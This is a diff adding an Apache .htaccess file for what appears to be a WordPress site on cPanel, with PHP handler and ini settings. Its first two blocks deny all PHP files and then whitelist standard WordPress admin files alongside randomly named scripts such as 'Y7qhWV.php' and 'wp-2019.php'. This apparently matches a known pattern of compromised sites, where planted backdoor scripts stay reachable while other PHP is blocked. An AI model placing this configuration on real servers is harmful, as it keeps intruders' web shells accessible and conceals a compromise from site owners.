@@ -1,0 +1,67 @@
+<FilesMatch ".(PhP|php5|suspected|phtml|php|Php)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(Y7qhWV.php|QVqq5Z.php|uulfNi.php|yjOR7b.php|rbAF6j.php|wp-2019.php|index.php|about.php|admin-ajax.php|admin-footer.php|admin-functions.php|admin-header.php|admin-post.php|admin.php|async-upload.php|authorize-application.php|comment.php|credits.php|custom-background.php|custom-header.php|customize.php|edit-comments.php|edit-form-advanced.php|edit-form-blocks.php|edit-form-comment.php|edit-link-form.php|edit-tag-form.php|edit-tags.php|edit.php|erase-personal-data.php|export-personal-data.php|export.php|freedoms.php|import.php|install-helper.php|install.php|link-add.php|link-manager.php|link-parse-opml.php|link.php|load-scripts.php|load-styles.php|media-new.php|media-upload.php|media.php|menu-header.php|menu.php|moderation.php|ms-admin.php|ms-delete-site.php|ms-edit.php|ms-options.php|ms-sites.php|ms-themes.php|ms-upgrade-network.php|ms-users.php|my-sites.php|nav-menus.php|network.php|options-discussion.php|options-general.php|options-head.php|options-media.php|options-permalink.php|options-privacy.php|options-reading.php|options-writing.php|options.php|plugin-editor.php|plugin-install.php|plugins.php|post-new.php|post.php|press-this.php|privacy-policy-guide.php|privacy.php|profile.php|revision.php|setup-config.php|site-health-info.php|site-health.php|term.php|theme-editor.php|theme-install.php|themes.php|tools.php|update-core.php|update.php|upgrade-functions.php|upgrade.php|upload.php|user-edit.php|user-new.php|users.php|widgets.php|wp-signup.php|wp-login.php|text.php|input.php|dropdown.php|checkbox.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+# BEGIN cPanel-generated php ini directives, do not edit
+# Manual editing of this file may result in unexpected behavior.
+# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
+# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
+<IfModule php7_module>
+   php_value default_charset "UTF-8"
+   php_value memory_limit 64M
+   php_value max_execution_time 36000
+   php_value upload_max_filesize 10999M
+   php_value mysql.connect_timeout 20
+   php_flag session.auto_start Off
+   php_flag session.use_only_cookies On
+   php_flag session.use_cookies On
+   php_flag session.use_trans_sid Off
+   php_value session.cookie_httponly "1"
+   php_value session.gc_maxlifetime 3600
+   php_flag display_errors Off
+   php_value max_input_time 60
+   php_value max_input_vars 1000
+   php_value post_max_size 80M
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php70"
+   php_flag zlib.output_compression Off
+</IfModule>
+<IfModule lsapi_module>
+   php_value default_charset "UTF-8"
+   php_value memory_limit 64M
+   php_value max_execution_time 36000
+   php_value upload_max_filesize 10999M
+   php_value mysql.connect_timeout 20
+   php_flag session.auto_start Off
+   php_flag session.use_only_cookies On
+   php_flag session.use_cookies On
+   php_flag session.use_trans_sid Off
+   php_value session.cookie_httponly "1"
+   php_value session.gc_maxlifetime 3600
+   php_flag display_errors Off
+   php_value max_input_time 60
+   php_value max_input_vars 1000
+   php_value post_max_size 80M
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php70"
+   php_flag zlib.output_compression Off
+</IfModule>
+# END cPanel-generated php ini directives, do not edit
+
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php73” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php73___lsphp .php .php7 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
